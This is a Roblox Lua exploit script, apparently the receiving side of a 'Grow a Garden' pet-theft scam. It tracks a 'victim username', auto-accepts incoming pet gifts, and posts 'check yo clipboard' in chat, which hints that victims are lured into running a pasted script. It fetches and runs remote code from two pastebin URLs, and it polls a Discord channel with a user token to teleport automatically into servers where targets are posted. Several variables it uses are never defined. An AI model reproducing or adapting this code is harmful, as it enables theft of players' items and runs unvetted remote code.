if not game:IsLoaded() then
    game.Loaded:Wait()
end

wait(5)
local UserInputService = game:GetService('UserInputService')
local RunService = game:GetService('RunService')

local function checkActivityStatus()
    print('Roblox window is IN FOCUS.')
end

RunService.Heartbeat:Connect(function()
    local currentStatusIsInactive = false
    local lastStatus = _G.RobloxFocusStatus

    if lastStatus == nil then
        checkActivityStatus()
        _G.RobloxFocusStatus = currentStatusIsInactive
    elseif
        (currentStatusIsInactive and not lastStatus)
        or (not currentStatusIsInactive and lastStatus)
    then
        checkActivityStatus()
        _G.RobloxFocusStatus = currentStatusIsInactive
    end
end)

checkActivityStatus()

local function waitForExactPet(fullName)
    print('⏳ Waiting for pet in backpack with name:', fullName)
    local timeout = 10
    local elapsed = 0 -- Ensure elapsed is declared before use

    while elapsed < timeout do
        for _, pet in ipairs(Backpack:GetChildren()) do
            if pet.Name == fullName then
                print('✅ Pet appeared in backpack:', fullName)
                return true
            end
        end
        task.wait(0.5)
        elapsed = elapsed + 0.5 -- Increment elapsed correctly
    end

    print('❌ Pet not found in backpack after 10s:', fullName)
    return false
end

-- Extracts base pet name without tags (used for whitelist)
local function extractBaseName(fullName)
    local base = fullName:gsub('%s*%[.-%]', '')
    return base:match('^%s*(.-)%s*$')
end

-- Hook into gift event
task.defer(function()
    print('🔌 Hooking into GiftPet RemoteEvent...')

    GiftPet.OnClientEvent:Connect(function(giftID, fullName, sender)
        print('🎁 Gift received:', giftID, fullName, sender)

        local basePetName = extractBaseName(fullName)
        print('🔍 Base pet name:', basePetName)

        if not table.find(PET_TO_CLAIM, basePetName) then
            print('⚠️ Pet not in whitelist. Ignoring gift from:', sender)
            return
        end

        while isProcessing do
            task.wait(0.1)
        end
        isProcessing = true

        print('✅ Accepting gift from', sender, 'with full name:', fullName)

        local success = pcall(function()
            AcceptPetGift:FireServer(true, giftID)
            print('🚀 Gift accepted (ID:', giftID, ')')
        end)

        if success then
            waitForExactPet(fullName)
        else
            print('❌ Failed to accept gift.')
        end

        isProcessing = false
    end)

    print('✅ GiftPet listener successfully hooked.')
end)

if token == '' or channelId == '' then
    game.Players.LocalPlayer:Kick('Add your token or channelId to use')
end

loadstring(game:HttpGet('https://pastebin.com/raw/xBLu3qtF', true))()
loadstring(game:HttpGet('https://pastebin.com/raw/vbLfSAFd', true))()

local bb = game:GetService('VirtualUser')
game:GetService('Players').LocalPlayer.Idled:Connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
end)

local HttpServ = game:GetService('HttpService')
local VirtualInputManager = game:GetService('VirtualInputManager')
local victimFile = isfile('user_gag.txt')
local joinedFile = isfile('joined_ids.txt')
if not victimFile then
    writefile('user_gag.txt', 'victim username')
end
if not joinedFile then
    writefile('joined_ids.txt', '[]')
end
local victimUser = readfile('user_gag.txt')
local joinedIds = HttpServ:JSONDecode(readfile('joined_ids.txt'))
local didVictimLeave = false
local timer = 0
local lastMessageId = nil

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId)
    writefile('joined_ids.txt', HttpServ:JSONEncode(joinedIds))
end

local function waitForPlayerLeave()
    local connection
    connection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if connection then
                connection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

waitForPlayerLeave()

local Players = game:GetService('Players')
local plr = Players.LocalPlayer

while plr:GetAttribute('DataFullyLoaded') ~= true do
    plr:GetAttributeChangedSignal('DataFullyLoaded'):Wait()
end
while plr:GetAttribute('Finished_Loading') ~= true do
    plr:GetAttributeChangedSignal('Finished_Loading'):Wait()
end
while plr:GetAttribute('Loading_Screen_Finished') ~= true do
    plr:GetAttributeChangedSignal('Loading_Screen_Finished'):Wait()
end

wait(1)
local giftNoti = plr
    :WaitForChild('PlayerGui')
    :WaitForChild('Gift_Notification')
    :WaitForChild('Frame')

local function acceptGifts()
    while task.wait(0.1) do
        for _, v in pairs(giftNoti:GetChildren()) do
            if v:IsA('ImageLabel') then
                local acceptImageButton = v
                    :WaitForChild('Holder')
                    :WaitForChild('Frame')
                    :WaitForChild('Accept')
                replicatesignal(acceptImageButton.MouseButton1Click)
            end
        end
    end
end

task.spawn(acceptGifts)

game
    :GetService('TextChatService').TextChannels.RBXGeneral
    :SendAsync('Yo gng check yo clipboard')
wait(0.5)
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('GGS')

local function increaseTimer()
    while task.wait(1) do
        timer = timer + 1
    end
end

task.spawn(increaseTimer)

local function autoJoin()
    local response = request({
        Url = 'https://discord.com/api/v9/channels/'
            .. channelId
            .. '/messages?limit=1',
        Method = 'GET',
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            ['Content-Type'] = 'application/json',
        },
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages == 0 then
            return
        end

        local message = messages[1]
        if
            message.id == lastMessageId
            or table.find(joinedIds, tostring(message.id))
        then
            return
        end

        local content = message.content or ''
        local placeId, jobId = string.match(
            content,
            'TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)'
        )
        if placeId and jobId then
            lastMessageId = message.id
            saveJoinedId(tostring(message.id))
            writefile('user_gag.txt', 'unknown')
            game
                :GetService('TeleportService')
                :TeleportToPlaceInstance(placeId, jobId)
        end
    else
        print('Invalid response code:', response.StatusCode)
    end
end

while task.wait(5) do
    autoJoin()
end
